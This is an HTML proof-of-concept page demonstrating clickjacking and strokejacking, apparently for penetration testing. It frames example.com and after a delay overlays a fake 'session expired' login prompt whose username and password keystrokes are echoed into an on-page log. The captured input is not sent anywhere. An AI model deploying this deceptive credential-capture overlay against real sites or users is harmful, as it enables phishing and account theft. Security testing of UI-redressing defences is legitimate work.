<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta charset="utf-8">
<title>Clickjacking, Strokejacking and Keylogger Proof of Concept</title>

<meta name="description" content="Clickjacking and strokejacking proof of concept demonstrating keylogger-style credential capture via UI redressing.">
<meta name="keywords" content="clickjacking, strokejacking, keylogger, keystroke capture, ui redressing, penetration testing">

<style>
  body {
    font-family: Arial, sans-serif;
    background: #f2f2f2;
    margin: 0;
    padding: 20px;
  }

  .header {
    max-width: 1600px;
    margin: 0 auto 15px auto;
    font-size: 14px;
  }

  .header a {
    color: #005ea5;
    text-decoration: none;
  }

  .layout {
    display: grid;
    grid-template-columns: 1fr 300px;
    gap: 15px;
    max-width: 1600px;
    margin: 0 auto;
  }

  .frame-wrapper {
    position: relative;
    width: 100%;
    height: 800px;
    border: 3px solid #b30000;
    background: #ffffff;
  }

  iframe {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    border: 0;
    z-index: 1;
  }

  .overlay {
    position: absolute;
    inset: 0;
    z-index: 2;
    background: rgba(255,255,255,0.01);
    display: none;
  }

  .prompt {
    position: absolute;
    top: 260px;
    left: 50%;
    transform: translateX(-50%);
    width: 480px;
    padding: 25px;
    background: #ffffff;
    border: 2px solid #005ea5;
    box-sizing: border-box;
  }

  .prompt input {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    font-size: 15px;
    box-sizing: border-box;
  }

  .log {
    background: #111;
    color: #00ff00;
    padding: 10px;
    font-size: 12px;
    height: 800px;
    overflow-y: auto;
    border: 2px solid #b30000;
  }
</style>
</head>

<body>

<div class="header">
  <strong>Clickjacking, Strokejacking and Keylogger Proof of Concept</strong><br>
</div>

<div class="layout">

  <div class="frame-wrapper">

    <iframe src="https://example.com/"></iframe>

    <div class="overlay" id="overlay">
      <div class="prompt">
        <p>Your session has expired. Please re-enter your details to continue.</p>
        <input type="text" placeholder="Username" oninput="logInput(this.value)">
        <input type="password" placeholder="Password" oninput="logInput(this.value)">
      </div>
    </div>

  </div>

  <div class="log" id="log">
    Interaction log:
  </div>

</div>

<script>
  const log = document.getElementById('log');
  const overlay = document.getElementById('overlay');

  function logMessage(message) {
    const time = new Date().toLocaleTimeString();
    log.innerHTML += '[' + time + '] ' + message + '<br>';
    log.scrollTop = log.scrollHeight;
  }

  function logInput(value) {
    logMessage('Keystrokes captured: ' + value);
  }

  window.setTimeout(() => {
    overlay.style.display = 'block';
    logMessage('Deceptive input overlay displayed');
  }, 4000);
</script>

</body>
</html>
